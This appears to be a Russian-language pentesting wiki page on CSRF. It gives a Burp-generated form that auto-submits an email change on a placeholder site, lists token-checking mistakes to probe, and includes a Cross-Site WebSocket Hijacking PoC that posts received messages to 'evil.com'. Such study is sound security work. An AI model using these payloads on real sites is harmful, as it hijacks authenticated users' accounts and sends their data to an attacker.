# CSRF

## Description

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated.

## Примеры использования

### Общий

Пример кейса с атакой CSRF: есть сайт с возможностью добавления почты. делаем запрос на добавление почты с другого сайта -> CSRF (токен может быть встроен в страницу, но не проверяться на стороне сервера)

Пример нагрузки:

```markup
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://vulnarable-site.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@email.com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>

```

### XS-Search

Это Side-Channel атака для получения доступа к информации, к которой другие пользователи имеют доступ, а атакующий не имеет

Необходимо:&#x20;

* CSRF
* Возможность предугадывать, есть ли контент или нет

Подробно и примеры:\
[https://book.hacktricks.xyz/pentesting-web/xs-search](https://book.hacktricks.xyz/pentesting-web/xs-search)\
[https://terjanq.github.io/Bug-Bounty/Google/cache-attack-06jd2d2mz2r0/index.html](https://terjanq.github.io/Bug-Bounty/Google/cache-attack-06jd2d2mz2r0/index.html)

### Mistakes

* Проверка CSRF-токена зависит от типа HTTP-запроса

Проверка CSRF-токен может быть включена для POST/PUT-запросов, но выключена для GET-запроса. Можно попробовать все параметры перегнать в GET-параметры и сделать такой запрос.

* Delete CSRF-token

Можем попробовать просто убрать токен из запроса.

* CSRF-токен не привязан к сессии

Можем подставить csrf-токен из другой сессии. А у приложения общий пул CSRF-токенов.



### Cross-Site WebSocket Hijacking

Суть в общем та же: пользователь заходит на нашу страницу, мы пробуем от его лица сделать запрос на открытие вебсокета. PoC:

```markup
<html>
    <body>
        <script src="jquery.min.js"></script>
        <script>
            // open
            var ws = new WebSocket("http://example.com", "chat");
            
            // send
            ws.send("Attacker's message");
            
            // receive
            ws.onmessage = function(event) {
                $.post("evil.com", event.data);
            }
        </script>
    </body>
</html>
```

Запрос будет выглядеть примерно так:

```
 GET /chat HTTP/1.1
 Host: example.com
 Upgrade: websocket
 Connection: Upgrade
 Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
 Origin: http://malicious-site.com
 Sec-WebSocket-Protocol: chat
 Sec-WebSocket-Version: 13
 Cookie: session_id=victim_uuid	
```

## CSRF Testing MindMap

![CSRF Testing MindMap](../../.gitbook/assets/image.png)

## Links & Papers

Подробнее о том как генерируется CSRF-токен и проверяется: [https://learn.javascript.ru/csrf](https://learn.javascript.ru/csrf).
